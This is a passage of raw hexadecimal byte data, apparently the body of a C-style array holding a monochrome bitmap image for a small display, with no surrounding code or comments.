0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFE,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X3F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X7F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X7F,0XFF,0XFF,0XFF,0XFB,0XFF,0XFF,0XFF,0XFF,
0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,
0X7F,0XFF,0XFF,0XFF,0XF1,0XFF,0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X7F,0XFF,0XFF,0XFF,0XF0,0X7F,0XFF,
0XFF,0XFF,0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFC,0X00,0X7F,0XFF,0XFF,0XFF,0XF7,0X1F,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X7F,0XFF,0XFF,0XFF,0XE7,
0X8F,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFC,0X00,0X63,0XFF,0XFF,0XFF,0XE7,0XE3,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X43,0XFF,0XFF,
0XFF,0XEF,0XF1,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X41,0XFF,0XFF,0XFF,0XCF,0XFC,0XFF,0XFF,0XFF,0X80,
0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X43,
0XFF,0XFF,0XFF,0XCF,0XF9,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X77,0XFF,0XFF,0XFF,0XDF,0XF3,0XFF,0XFF,
0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,
0X00,0X7F,0XFF,0XFF,0XFF,0X9F,0XE7,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X7F,0XFF,0XFF,0XFF,0X9F,0XCF,
0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFE,0X00,0X7F,0XFF,0XFF,0XFF,0XBF,0X9F,0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X7F,0XFF,0XFF,0XFF,
0X3F,0X3F,0XFF,0XFF,0XFF,0X80,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFE,0X00,0X7F,0XFF,0XFF,0XFF,0X3E,0X7F,0XFF,0XFF,0XFF,0X80,0X1F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,
0XFF,0XFF,0X7C,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFE,0X79,0XFF,0XFF,0XFF,0XFF,
0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,
0X3F,0XFF,0XFF,0XFE,0X63,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X3F,0XFF,0XFF,0XFE,0XCF,0XFF,0XFF,
0XFF,0XFF,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0X00,0X1F,0XFF,0XFF,0XFC,0X8F,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFD,0X1F,
0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0X00,0X1F,0XFF,0XFF,0XFC,0X7F,0XFF,0XFF,0XFF,0XFE,0X00,0X3F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,
0XF8,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X0F,0XFF,0XFF,0XF9,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,
0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X07,
0XFF,0XFF,0XF3,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X07,0XFF,0XFF,0XF7,0XFF,0XFF,0XFF,0XFF,
0XF8,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XC0,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0XFC,0XFF,0XFF,
0XFF,0XFF,0XFF,0X8F,0XC0,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X78,0X7F,0XFF,0XFF,0XFF,0XFF,0X87,0X80,0X07,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X38,
0X7F,0XFF,0XFF,0XFF,0XFF,0X87,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X18,0X7F,0XFF,0XFF,0XFF,0XFF,0X86,0X00,
0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,
0X00,0X0C,0XFF,0XFF,0XFF,0XFF,0XFF,0XCC,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,
0XF8,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X01,0XFF,0XFF,0XFF,
0XFF,0XFF,0XE0,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X7F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X3F,
0XFF,0XE1,0XFF,0XFF,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X0F,0XFF,0XE1,0XFF,0XFC,0X00,0X01,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,
0X00,0X03,0XFF,0XE1,0XFF,0XF0,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X7F,0XE1,0XFF,0X80,0X00,
0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFC,0X00,0X00,0X0F,0XFF,0XFC,0X00,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFC,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X1E,0X00,
0X00,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X00,0X00,0X00,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XC0,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X00,
0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X18,0X1F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X00,0X00,0X00,0X01,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0X00,0X01,0XEF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,
0X00,0X00,0X00,0X00,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X00,0X00,0X7F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,0X00,0X00,0X00,0X1F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X0C,0X30,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X80,0X00,0X00,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X81,0XFC,
0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X00,0X00,0X03,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X1C,0X00,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X00,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,
0X00,0X00,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,
0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X00,0X0F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFC,0X00,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X01,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XC0,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X07,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFC,0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X3F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X0F,0XFF,0XFF,0XFF,0X80,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,
0X00,0X7F,0XFF,0XE0,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X00,0X00,0X00,0X00,0X00,0X00,0X7F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFC,0X00,0X00,0X00,0X00,0X00,0X00,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X00,0X00,0X00,
0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X00,0X00,0X00,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X00,
0X00,0X00,0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,0X00,0X00,0X00,0X00,0X00,0X7F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,
0X00,0X00,0X00,0X00,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X00,0X00,0XFF,0X80,0X00,0X07,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0X00,0X00,0X1F,0XFF,0XF0,0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X3F,0XFF,0XFF,0XFC,
0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XC0,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X7F,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XF8,0X00,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,
0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XC0,0X00,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X00,0X00,0X00,0X03,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XF8,0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X00,0X00,0X00,
0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X00,0X00,0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,
0X00,0X00,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X00,0X00,0X00,0X00,0XC1,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XE0,0X00,0X00,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,0X00,0X0E,0X0F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X06,0X00,0X67,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X00,
0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X80,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XC0,0X00,0X8F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X08,0X6F,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFC,0X0C,0X00,0X1F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X3F,0X80,0XC7,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X80,0XFF,0XF2,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFE,0X01,0XFF,0XFF,
0X9F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XF0,0X47,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFB,0XFF,0XFF,0XFF,0XFF,0XE0,0X8F,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XE3,0XFF,0XFF,0XFF,0XFF,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X87,0XFF,0XFF,0XFF,0XF8,
0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFE,0X07,0XFF,0XFF,0XFF,0XE0,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X07,0XFF,0XFF,
0XFF,0X00,0X07,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X07,0XFF,0XFF,0XFC,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X0F,
0XFF,0XFF,0XF0,0X00,0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0X00,0X0F,0XFF,0XFF,0XC0,0X00,0X7F,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XCF,0XFF,0XFF,0XFF,0XFC,
0X00,0X0F,0XFF,0XFE,0X00,0X01,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0X0F,0XFF,0XFF,0XFF,0XF0,0X00,0X0F,0XFF,0XF8,0X00,0X03,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X1F,0XFF,0XFF,
0XFF,0XC0,0X00,0X1F,0XFF,0XC0,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XF8,0X1F,0XFF,0XFF,0XFF,0X00,0X00,0X1F,0XFF,0X00,0X00,
0X3F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XE0,0X1F,
0XFF,0XFF,0XFC,0X00,0X00,0X1F,0XF8,0X00,0X00,0X7F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XC0,0X1F,0XFF,0XFF,0XF8,0X00,0X00,0X1F,0XF0,
0X00,0X00,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
0X00,0X1F,0XFF,0XFF,0XE0,0X00,0X00,0X1F,0X80,0X00,0X03,0XFF,0XFF,0XFF,0XFF,0XFF,
0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFC,0X00,0X1F,0XFF,0XFF,0X80,0X00,0X00,
0X3C,0X00,0X00,0X0F,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,0XFF,
